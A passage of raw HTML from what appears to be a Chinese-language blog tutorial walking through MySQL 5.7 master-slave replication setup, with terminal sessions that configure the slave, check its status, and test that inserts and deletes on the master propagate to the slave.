class="keyword">with</span>&#xA0;&#x2010;A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span>&#xA0;<span class="keyword">changed</span></span><br><span class="line">mysql&gt;&#xA0;<span class="keyword">show</span>&#xA0;<span class="keyword">tables</span>;</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">|&#xA0;Tables_in_TESTDB&#xA0;|</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">|&#xA0;table666&#xA0;|</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">1&#xA0;row&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.00</span>&#xA0;sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;<span class="keyword">exit</span></span><br><span class="line">Bye</span><br></pre></td></tr></tbody></table></figure><p>&#x6307;&#x5B9A;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x91CD;&#x542F;slave<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL2&#xA0;~]<span class="comment">#&#xA0;mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.</span><br><span class="line">Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;<span class="keyword">end</span>&#xA0;<span class="keyword">with</span>&#xA0;;&#xA0;or&#xA0;\g.</span><br><span class="line">Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;3</span><br><span class="line">Server&#xA0;version:&#xA0;5.7.19&#xA0;Source&#xA0;distribution</span><br><span class="line"></span><br><span class="line">Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.</span><br><span class="line"></span><br><span class="line">Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its</span><br><span class="line">affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type&#xA0;&apos;<span class="keyword">help</span>;&apos;&#xA0;or&#xA0;&apos;\h&apos;&#xA0;for&#xA0;help.&#xA0;<span class="keyword">Type</span>&#xA0;<span class="string">&apos;\c&apos;</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">clear</span>&#xA0;the&#xA0;<span class="keyword">current</span>&#xA0;<span class="keyword">input</span>&#xA0;statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;<span class="keyword">stop</span>&#xA0;<span class="keyword">slave</span>;</span><br><span class="line">Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected,&#xA0;1&#xA0;warning&#xA0;(0.00&#xA0;sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;change&#xA0;master&#xA0;to master_host=&apos;192.168.10.67&apos;,master_user=&apos;slave&apos;,master_password=&apos;Jaking@vip.163.com&apos;;</span><br><span class="line">Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected,&#xA0;2&#xA0;warnings&#xA0;(0.00&#xA0;sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;start&#xA0;slave;</span><br><span class="line">Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected&#xA0;(0.00&#xA0;sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;show&#xA0;slave&#xA0;status\G</span><br><span class="line">***************************&#xA0;1.&#xA0;row&#xA0;***************************</span><br><span class="line">Slave_IO_State:&#xA0;Waiting&#xA0;for&#xA0;master&#xA0;to&#xA0;send&#xA0;event</span><br><span class="line">Master_Host:&#xA0;192.168.10.67</span><br><span class="line">Master_User:&#xA0;slave</span><br><span class="line">Master_Port:&#xA0;3306</span><br><span class="line">Connect_Retry:&#xA0;60</span><br><span class="line">Master_Log_File:&#xA0;mysql&#x2010;bin&#x2010;master.000002</span><br><span class="line">Read_Master_Log_Pos:&#xA0;601</span><br><span class="line">Relay_Log_File:&#xA0;MySQL2&#x2010;relay&#x2010;bin.000003</span><br><span class="line">Relay_Log_Pos:&#xA0;828</span><br><span class="line">Relay_Master_Log_File:&#xA0;mysql&#x2010;bin&#x2010;master.000002</span><br><span class="line">Slave_IO_Running:&#xA0;Yes</span><br><span class="line">Slave_SQL_Running:&#xA0;Yes</span><br></pre></td></tr></tbody></table></figure><p></p><p>Slave_IO_Running &#xFF1A;&#x4E00;&#x4E2A;&#x8D1F;&#x8D23;&#x4E0E;&#x4E3B;&#x673A;&#x7684;IO&#x901A;&#x4FE1;<br>Slave_SQL_Running&#xFF1A;&#x8D1F;&#x8D23;&#x81EA;&#x5DF1;&#x7684;slave mysql&#x8FDB;&#x7A0B;<br>&#x4E24;&#x4E2A;&#x4E3A; Yes &#x5C31;&#x6210;&#x529F;&#x4E86;&#xFF01;  </p><p>&#x518D;&#x5230;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x4E0A;&#x67E5;&#x770B;&#x72B6;&#x6001;  </p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">1 [root@MySQL1&#xA0;mysql&#x2010;5.7.19]<span class="comment">#&#xA0;mysql&#xA0;&#x2010;uroot&#xA0;&#x2010;pJaking@vip.163.com</span></span><br><span class="line">2 mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;in</span><br><span class="line">secure.</span><br><span class="line">3 Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;<span class="keyword">end</span>&#xA0;<span class="keyword">with</span>&#xA0;;&#xA0;or&#xA0;\g.</span><br><span class="line">4 Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;7</span><br><span class="line">5 Server&#xA0;version:&#xA0;5.7.19&#x2010;log&#xA0;Source&#xA0;distribution</span><br><span class="line">6</span><br><span class="line">7 Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserv</span><br><span class="line">ed.</span><br><span class="line">8</span><br><span class="line">9 Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its</span><br><span class="line">10 affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective</span><br><span class="line">11 owners.</span><br><span class="line">12</span><br><span class="line">13 Type&#xA0;&apos;<span class="keyword">help</span>;&apos;&#xA0;or&#xA0;&apos;\h&apos;&#xA0;for&#xA0;help.&#xA0;<span class="keyword">Type</span>&#xA0;<span class="string">&apos;\c&apos;</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">clear</span>&#xA0;the&#xA0;<span class="keyword">current</span>&#xA0;<span class="keyword">input</span>&#xA0;stat</span><br><span class="line">ement.</span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="number">15</span> mysql&gt;&#xA0;<span class="keyword">show</span>&#xA0;<span class="keyword">processlist</span>\G</span><br><span class="line"><span class="number">16</span> ***************************&#xA0;<span class="number">1.</span>&#xA0;<span class="keyword">row</span>&#xA0;***************************</span><br><span class="line"><span class="number">17</span> &#xA0;<span class="keyword">Id</span>:&#xA0;<span class="number">6</span></span><br><span class="line"><span class="number">18</span> &#xA0;<span class="keyword">User</span>:&#xA0;<span class="keyword">slave</span></span><br><span class="line"><span class="number">19</span> &#xA0;Host:&#xA0;<span class="number">192.168</span><span class="number">.10</span><span class="number">.68</span>:<span class="number">54656</span></span><br><span class="line"><span class="number">20</span> &#xA0;db:&#xA0;<span class="literal">NULL</span></span><br><span class="line"><span class="number">21</span> Command:&#xA0;<span class="keyword">Binlog</span>&#xA0;Dump</span><br><span class="line"><span class="number">22</span> &#xA0;<span class="built_in">Time</span>:&#xA0;<span class="number">165</span></span><br><span class="line"><span class="number">23</span> &#xA0;State:&#xA0;<span class="keyword">Master</span>&#xA0;TESTDBs&#xA0;sent&#xA0;all&#xA0;<span class="keyword">binlog</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">slave</span>;&#xA0;waiting&#xA0;for&#xA0;more&#xA0;updates</span><br><span class="line">24 &#xA0;Info:&#xA0;NULL</span><br><span class="line">25 ***************************&#xA0;2.&#xA0;row&#xA0;***************************</span><br><span class="line">26 &#xA0;Id:&#xA0;7</span><br><span class="line">27 &#xA0;User:&#xA0;root</span><br><span class="line">28 &#xA0;Host:&#xA0;localhost</span><br><span class="line">29 &#xA0;db:&#xA0;NULL</span><br><span class="line">30 Command:&#xA0;Query</span><br><span class="line">31 &#xA0;Time:&#xA0;0</span><br><span class="line">32 &#xA0;State:&#xA0;starting</span><br><span class="line">33 &#xA0;Info:&#xA0;<span class="keyword">show</span>&#xA0;<span class="keyword">processlist</span></span><br><span class="line"><span class="number">34</span> <span class="number">2</span>&#xA0;<span class="keyword">rows</span>&#xA0;<span class="keyword">in</span>&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.00</span>&#xA0;sec)</span><br><span class="line"><span class="number">35</span></span><br><span class="line"><span class="number">36</span> mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL1 ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 11</span><br><span class="line">Server version: 5.7.19-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testdb             |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> testdb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| Tables_in_testdb |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| table666         |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> table666;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table666(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;1&apos;</span>,<span class="string">&apos;Linux&apos;</span>,<span class="string">&apos;66&apos;</span>,<span class="string">&apos;DZ&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table666(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;2&apos;</span>,<span class="string">&apos;CLD&apos;</span>,<span class="string">&apos;68&apos;</span>,<span class="string">&apos;RM&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table666(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;3&apos;</span>,<span class="string">&apos;SYS&apos;</span>,<span class="string">&apos;90&apos;</span>,<span class="string">&apos;JX&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table666(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;4&apos;</span>,<span class="string">&apos;MySQL1&apos;</span>,<span class="string">&apos;71&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table666(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;5&apos;</span>,<span class="string">&apos;MySQL2&apos;</span>,<span class="string">&apos;72&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table666(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;6&apos;</span>,<span class="string">&apos;MySQL3&apos;</span>,<span class="string">&apos;73&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from table666;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">|       6 | MySQL3 |    73 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br><span class="line">[root@MySQL1 ~]<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL2 ~]<span class="comment"># mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 9</span><br><span class="line">Server version: 5.7.19 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> testdb.table666;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">|       6 | MySQL3 |    73 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x4E3B;&#x5E93;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from table666;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">|       6 | MySQL3 |    73 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">delete</span> <span class="keyword">from</span> table666 <span class="keyword">where</span> bName=<span class="string">&quot;MySQL3&quot;</span>;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from table666;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x4ECE;&#x5E93;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from testdb.table666;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x4E3B;&#x5E93;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from table666;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">INSERT</span> <span class="keyword">INTO</span> table666(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;666&apos;</span>,<span class="string">&apos;Linux666&apos;</span>,<span class="string">&apos;666&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from table666;                                                 </span><br><span class="line">+<span class="comment">---------+----------+-------+------------+</span></span><br><span class="line">| bTypeId | bName    | price | publishing |</span><br><span class="line">+<span class="comment">---------+----------+-------+------------+</span></span><br><span class="line">|       1 | Linux    |    66 | DZ         |</span><br><span class="line">|       2 | CLD      |    68 | RM         |</span><br><span class="line">|       3 | SYS      |    90 | JX         |</span><br><span class="line">|       4 | MySQL1   |    71 | QH         |</span><br><span class="line">|       5 | MySQL2   |    72 | QH         |</span><br><span class="line">|     666 | Linux666 |   666 | QH         |</span><br><span class="line">+<span class="comment">---------+----------+-------+------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x4ECE;&#x5E93;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from testdb.table666;</span><br><span class="line">+<span class="comment">---------+----------+-------+------------+</span></span><br><span class="line">| bTypeId | bName    | price | publishing |</span><br><span class="line">+<span class="comment">---------+----------+-------+------------+</span></span><br><span class="line">|       1 | Linux    |    66 | DZ         |</span><br><span class="line">|       2 | CLD      |    68 | RM         |</span><br><span class="line">|       3 | SYS      |    90 | JX         |</span><br><span class="line">|       4 | MySQL1   |    71 | QH         |</span><br><span class="line">|       5 | MySQL2   |    72 | QH         |</span><br><span class="line">|     666 | Linux666 |   666 | QH         |</span><br><span class="line">+<span class="comment">---------+----------+-------+------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;"><a href="#&#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;" class="headerlink" title="&#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;"></a>&#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;</h2><h2 